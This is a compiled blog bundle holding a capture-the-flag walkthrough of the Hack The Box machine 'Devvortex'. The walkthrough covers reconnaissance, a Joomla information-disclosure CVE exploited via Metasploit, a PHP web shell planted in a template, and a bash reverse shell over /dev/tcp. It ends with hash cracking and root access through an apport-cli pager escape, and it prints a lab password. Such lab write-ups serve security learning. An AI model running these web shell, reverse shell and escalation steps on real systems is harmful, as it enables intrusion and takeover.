"use strict";(self.webpackChunkmy_blog=self.webpackChunkmy_blog||[]).push([[455],{147:(e,t,a)=>{a.d(t,{A:()=>n});const n=a.p+"assets/images/image-d-28-e36283cc91dc609ddd59344035ce6744.png"},633:(e,t,a)=>{a.d(t,{A:()=>n});const n=a.p+"assets/images/image-d-22-27f019de9f4d33ee6d729ecc281f18cb.png"},1433:(e,t,a)=>{a.d(t,{A:()=>n});const n=a.p+"assets/images/image-d-31-2774395f6e143f326ba75509ac49d5ae.png"},1765:(e,t,a)=>{a.d(t,{A:()=>n});const n=a.p+"assets/images/image-d-17-94c2d53fb65e816a4eeb82008cdbbb59.png"},2429:(e,t,a)=>{a.d(t,{A:()=>n});const n=a.p+"assets/images/image-d-26-72e40dce133041c12a356b8cce509ec6.png"},2484:(e,t,a)=>{a.d(t,{A:()=>n});const n=a.p+"assets/images/image-d-27-cd620f993561d755d1a59ba6ede6e568.png"},2570:(e,t,a)=>{a.d(t,{A:()=>n});const n=a.p+"assets/images/image-d-29-0e34053de210192c7f4ab444d5563b83.png"},2847:(e,t,a)=>{a.d(t,{A:()=>n});const n=a.p+"assets/images/image-d-16-9e8c637714a5d2786923a81b75d17d1e.png"},3250:(e,t,a)=>{a.d(t,{A:()=>n});const n=a.p+"assets/images/image-d-32-853911cd2d598657383990bb52fd72b2.png"},3586:(e,t,a)=>{a.d(t,{A:()=>n});const n=a.p+"assets/images/image-d-18-78a12e56ddd0a78b24535466bc1f64b5.png"},4139:(e,t,a)=>{a.d(t,{A:()=>n});const n=a.p+"assets/images/image-d-20-45ed18a4a4c42b9bce658a5620b06605.png"},4379:(e,t,a)=>{a.d(t,{A:()=>n});const n=a.p+"assets/images/image-d-33-8fa8c993c1d0396725c49f0b6a2db071.png"},4528:(e,t,a)=>{a.d(t,{A:()=>n});const n=a.p+"assets/images/image-d-30-de20217ae3fed9678f6851340e117d05.png"},4715:(e,t,a)=>{a.d(t,{A:()=>n});const n=a.p+"assets/images/image-d-19-6c50c0f44641186342eefdf28d587e5e.png"},5628:(e,t,a)=>{a.r(t),a.d(t,{assets:()=>d,contentTitle:()=>o,default:()=>h,frontMatter:()=>i,metadata:()=>l,toc:()=>r});var n=a(8168),s=(a(6540),a(5680));const i={},o=void 0,l={permalink:"/Blog/blog/Devvortex",editUrl:"https://github.com/danae-pan/Blog/blog/Devvortex.md",source:"@site/blog/Devvortex.md",title:"Devvortex",description:"Task 1",date:"2025-04-05T21:15:54.538Z",formattedDate:"April 5, 2025",tags:[],readingTime:4.58,truncated:!1,authors:[],nextItem:{title:"Sau",permalink:"/Blog/blog/Sau"}},d={authorsImageUrls:[]},r=[{value:"Task 1",id:"task-1",children:[]},{value:"Task 2",id:"task-2",children:[]},{value:"Task 3",id:"task-3",children:[]},{value:"Task 4",id:"task-4",children:[]},{value:"Task 5",id:"task-5",children:[]},{value:"Task 6",id:"task-6",children:[]},{value:"Task 7",id:"task-7",children:[]},{value:"Task 8",id:"task-8",children:[]},{value:"Task 9",id:"task-9",children:[]},{value:"Task 10",id:"task-10",children:[]},{value:"Task 11",id:"task-11",children:[]},{value:"Task 12",id:"task-12",children:[]}],g={toc:r},p="wrapper";function h(e){let{components:t,...i}=e;return(0,s.yg)(p,(0,n.A)({},g,i,{components:t,mdxType:"MDXLayout"}),(0,s.yg)("h3",{id:"task-1"},"Task 1"),(0,s.yg)("p",null,"How many open TCP ports are listening on Devvortex?"),(0,s.yg)("p",null,"We can run a nmap to scan the ports on the target ip."),(0,s.yg)("p",null,(0,s.yg)("inlineCode",{parentName:"p"},"nmap -sS <target_ip>")),(0,s.yg)("p",null,(0,s.yg)("img",{alt:"alt text",src:a(7758).A})),(0,s.yg)("h3",{id:"task-2"},"Task 2"),(0,s.yg)("p",null,"What subdomain is configured on the target's web server?"),(0,s.yg)("p",null,"Navigating to the ip address on the browser we get this nice screen."),(0,s.yg)("p",null,(0,s.yg)("img",{alt:"alt text",src:a(6983).A})),(0,s.yg)("p",null,"This seems that the hostname cannot be resolved. Lets edit the /etc/hosts file to add the ip address to be resolved to the target domain."),(0,s.yg)("p",null,(0,s.yg)("inlineCode",{parentName:"p"},"sudo vim /etc/hosts")),(0,s.yg)("p",null,(0,s.yg)("img",{alt:"alt text",src:a(2847).A})),(0,s.yg)("p",null,"Then for finding the subdomain, we can use gobuster vhost since it is often that htb machine will use name-based virtual hosting, that is when multiple names run on a single ip address."),(0,s.yg)("p",null,(0,s.yg)("inlineCode",{parentName:"p"},"gobuster vhost -u https://devvortex.htb/ -w usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain")),(0,s.yg)("p",null,(0,s.yg)("img",{alt:"alt text",src:a(1765).A})),(0,s.yg)("p",null,"We now found the subdomain ",(0,s.yg)("inlineCode",{parentName:"p"},"dev.devvortex.htb"),"."),(0,s.yg)("h3",{id:"task-3"},"Task 3"),(0,s.yg)("p",null,"What Content Management System (CMS) is running on dev.devvortex.htb?"),(0,s.yg)("p",null,"We need to add the previous subdomain we found on the hosts file as well so again, we use the command ",(0,s.yg)("inlineCode",{parentName:"p"},"sudo vim /etc/hosts"),"."),(0,s.yg)("p",null,"For finding the CMS, we can use WhatWeb."),(0,s.yg)("p",null,"After navigating to ",(0,s.yg)("inlineCode",{parentName:"p"},"usr/bin")," directory we can run ",(0,s.yg)("inlineCode",{parentName:"p"},"whatweb -a 3 dev.devvortex.htb -v")),(0,s.yg)("p",null,(0,s.yg)("img",{alt:"alt text",src:a(3586).A})),(0,s.yg)("p",null,"From this search, we could not find the CMS. We can try to dig further on the website by doing a gobuster dir seach to explore further endpoints. "),(0,s.yg)("p",null,(0,s.yg)("inlineCode",{parentName:"p"},"gobuster dir -u http://dev.devvortex.htb -w common.txt")),(0,s.yg)("p",null,"From this search we found many endpoints with different status code that will be useful in the following task, one of them is the /administrator endpoint which is usually an interesting finding."),(0,s.yg)("p",null,"Navigating there we see a usual administrator login that reveals that the CMS used is Joomla."),(0,s.yg)("p",null,(0,s.yg)("img",{alt:"alt text",src:a(4715).A})),(0,s.yg)("p",null,"We csn also find this  looking in the /robots.txt endpoint which is a file that contains the redirections and other info. "),(0,s.yg)("p",null,(0,s.yg)("img",{alt:"alt text",src:a(4139).A})),(0,s.yg)("h3",{id:"task-4"},"Task 4"),(0,s.yg)("p",null,"Which version of Joomla is running on the target system?"),(0,s.yg)("p",null,"The information about Joomla version is usually on a public facing file that is located on different paths depending on the version of Joomla. It is often that the information is stores under modules diretory or under libraries but this varies. After a google search lookup we find different sources including ",(0,s.yg)("a",{parentName:"p",href:"https://www.itoctopus.com/how-to-quickly-know-the-version-of-any-joomla-website"},"https://www.itoctopus.com/how-to-quickly-know-the-version-of-any-joomla-website"),". Finally, navigating to ",(0,s.yg)("inlineCode",{parentName:"p"},"http://dev.devvortex.htb/administrator/manifests/files/joomla.xml")," we find the Joomla version."),(0,s.yg)("p",null,(0,s.yg)("img",{alt:"alt text",src:a(633).A})),(0,s.yg)("h3",{id:"task-5"},"Task 5"),(0,s.yg)("p",null,"What is the 2023 CVE ID for an information disclosure vulnerability in the version of Joomla running on DevVortex?"),(0,s.yg)("p",null,"Searching google for vulnerabilities of the specific Joomla version we found, we quickly find that the CVE-2023-23752 that affects a series of Joomla version including ours."),(0,s.yg)("h3",{id:"task-6"},"Task 6"),(0,s.yg)("p",null,"What is the lewis user's password for the CMS?"),(0,s.yg)("p",null,"We launch metasploit ",(0,s.yg)("inlineCode",{parentName:"p"},"msfconsole")," and search for the cve we found before. "),(0,s.yg)("p",null,(0,s.yg)("img",{alt:"alt text",src:a(9922).A})),(0,s.yg)("p",null,"We then ",(0,s.yg)("inlineCode",{parentName:"p"},"use 0")," to select the options, then ",(0,s.yg)("inlineCode",{parentName:"p"},"set RHOSTS dev.devvortex.htb")," to set the target host and finally ",(0,s.yg)("inlineCode",{parentName:"p"},"run")," to run the auxiliary. From this, we successfully get the user's password. "),(0,s.yg)("p",null,(0,s.yg)("img",{alt:"alt text",src:a(5808).A})),(0,s.yg)("h3",{id:"task-7"},"Task 7"),(0,s.yg)("p",null,"We can use the credentials from previously to login as administrator on the /administrator endpoint. Navigating to System page we find that there is the template option. Under Site Templates we edit the Cassiopeia Details and Files."),(0,s.yg)("p",null,(0,s.yg)("img",{alt:"alt text",src:a(7135).A})),(0,s.yg)("p",null,"We add this line of code ",(0,s.yg)("inlineCode",{parentName:"p"},"system($_GET['cmd']);")," on the error.php file to get a reverse shell. Before navigating to  ",(0,s.yg)("inlineCode",{parentName:"p"},'http://dev.devvortex.htb/templates/cassiopeia/error.php?cmd=bash -c "bash -i >%26 /dev/tcp/<local_ip>/4444 0>%261"')," we need to open a port listening for connections. We can do this by ",(0,s.yg)("inlineCode",{parentName:"p"},"nc -lnvp 4444"),". After navigating to that url, we obtain a shell."),(0,s.yg)("p",null,(0,s.yg)("img",{alt:"alt text",src:a(2429).A})),(0,s.yg)("p",null,"First we spawn a proper shell so we don't get stuck onwards. "),(0,s.yg)("p",null,(0,s.yg)("inlineCode",{parentName:"p"},"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'")),(0,s.yg)("p",null,"We can now connect to the database with the credential we found before."),(0,s.yg)("p",null,(0,s.yg)("inlineCode",{parentName:"p"},"mysql -u lewis -p"),"\nP4ntherg0t1n5r3c0n##"),(0,s.yg)("p",null,(0,s.yg)("img",{alt:"alt text",src:a(2484).A})),(0,s.yg)("p",null,"We list all tables by ",(0,s.yg)("inlineCode",{parentName:"p"},"show tables;")," and then ",(0,s.yg)("inlineCode",{parentName:"p"},"describe sd4fg_users;")," to see all fields for the user. There, we identfy that this is the table we are asked for by ",(0,s.yg)("inlineCode",{parentName:"p"},"select username, id, password from sd4fg_users where username = 'logan';")," and see the hashed password."),(0,s.yg)("p",null,(0,s.yg)("img",{alt:"alt text",src:a(147).A})),(0,s.yg)("h3",{id:"task-8"},"Task 8"),(0,s.yg)("p",null,"From the previous task, we listed the hashed password for the logan user by using the select command. We open a new terminal and store this password on a file named ",(0,s.yg)("inlineCode",{parentName:"p"},"logan.hash")," and then we can use john the ripper to crack the password so we can obtain the plain text from the hashed version. "),(0,s.yg)("p",null,(0,s.yg)("img",{alt:"alt text",src:a(2570).A})),(0,s.yg)("h3",{id:"task-9"},"Task 9"),(0,s.yg)("p",null,"Submit the flag located in the logan user's home directory."),(0,s.yg)("p",null,"With the password we found from the previous task, we ssh to the server with the user logan. "),(0,s.yg)("p",null,(0,s.yg)("img",{alt:"alt text",src:a(4528).A})),(0,s.yg)("p",null,"In this user's home directory we find the user.txt that contains the user's flag."),(0,s.yg)("h3",{id:"task-10"},"Task 10"),(0,s.yg)("p",null,"What is the full path to the binary that the lewis user can run with root privileges using sudo?"),(0,s.yg)("p",null,"We can find the path by running ",(0,s.yg)("inlineCode",{parentName:"p"},"sudo -l"),"."),(0,s.yg)("p",null,(0,s.yg)("img",{alt:"alt text",src:a(1433).A})),(0,s.yg)("h3",{id:"task-11"},"Task 11"),(0,s.yg)("p",null,"What is the 2023 CVE ID of the privilege escalation vulnerability in the installed version of apport-cli?"),(0,s.yg)("p",null,"With a google search, we find the id of the CVE to be CVE-2023-1326. "),(0,s.yg)("h3",{id:"task-12"},"Task 12"),(0,s.yg)("p",null,"Submit the flag located in the root user's home directory."),(0,s.yg)("p",null,"We start by running sudo /usr/bin/apport-cli --file-bug\n",(0,s.yg)("img",{alt:"alt text",src:a(3250).A})),(0,s.yg)("p",null,"There we press any key:"),(0,s.yg)("p",null,(0,s.yg)("img",{alt:"alt text",src:a(4379).A})),(0,s.yg)("p",null,"Then we press any key, and finally the option of view report (V) where we land in a text viewer and obtain the root shell by running ",(0,s.yg)("inlineCode",{parentName:"p"},"!/bin/bash")),(0,s.yg)("p",null,(0,s.yg)("img",{alt:"alt text",src:a(8468).A})),(0,s.yg)("p",null,"In the home directory of the root user we find the root.txt which contains the root's flag."))}h.isMDXComponent=!0},5808:(e,t,a)=>{a.d(t,{A:()=>n});const n=a.p+"assets/images/image-d-23-460ec15c6e4f76d5a3dcf2727a14b02d.png"},6983:(e,t,a)=>{a.d(t,{A:()=>n});const n=a.p+"assets/images/image-d-15-9b45af95772d0e212cb36bcfb30d249e.png"},7135:(e,t,a)=>{a.d(t,{A:()=>n});const n=a.p+"assets/images/image-d-24-5133e5da53d77150b3f69c5011b3d9f0.png"},7758:(e,t,a)=>{a.d(t,{A:()=>n});const n=a.p+"assets/images/image-d-14-8759210d29fdcde3c50e019b6d29d7a1.png"},8468:(e,t,a)=>{a.d(t,{A:()=>n});const n=a.p+"assets/images/image-d-34-559efc57d3d9ac694ddef2e34558957b.png"},9922:(e,t,a)=>{a.d(t,{A:()=>n});const n=a.p+"assets/images/image-d-21-71975af2cc875a8b1f3fba7ff4f926bc.png"}}]);